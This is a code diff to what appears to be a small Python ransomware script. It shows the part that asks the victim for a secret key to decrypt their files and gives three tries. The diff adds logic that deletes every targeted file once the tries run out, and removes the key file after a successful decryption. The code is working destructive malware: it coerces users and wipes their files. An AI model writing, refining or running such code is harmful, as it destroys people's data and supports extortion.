@@ -19,15 +19,17 @@ for file in os.listdir():
     
 # print(files)
 
-with open(".thekey.key", "rb") as thekey:
-    secretkey = thekey.read()
+with open("thekey.key", "rb") as thekey:
+    secretkey = thekey.read().decode("utf-8")   #secret key is Byte, not String
 
-userkey = input("Enter the secret key to decrypt your files\n")
+# print(secretkey.decode("utf-8"))
 
 
 count = 3
 
 while(count!=0):
+    userkey = input("Enter the secret key to decrypt your files\n")
+    
     if userkey == secretkey:
         for file in files:
             with open(file, "rb") as thefile:
@@ -37,16 +39,16 @@ while(count!=0):
 
             with open(file, "wb") as thefile:
                 thefile.write(content_decrypted)
+
         print("Sucessfully Decrypted\n")
+        os.remove("thekey.key")
+        break
     else:
         count -= 1
-
-        if count == 0:
-            for file in files:
-                os.remove(file)
-            print("Deleted all files!\n")
-            break
-
         print(f"Warning!... Will Delete all files in next {count} Incorrect tries\n")
 
 
+if count == 0:
+    for file in files:
+        os.remove(file)
+    print("Deleted all files!\n")
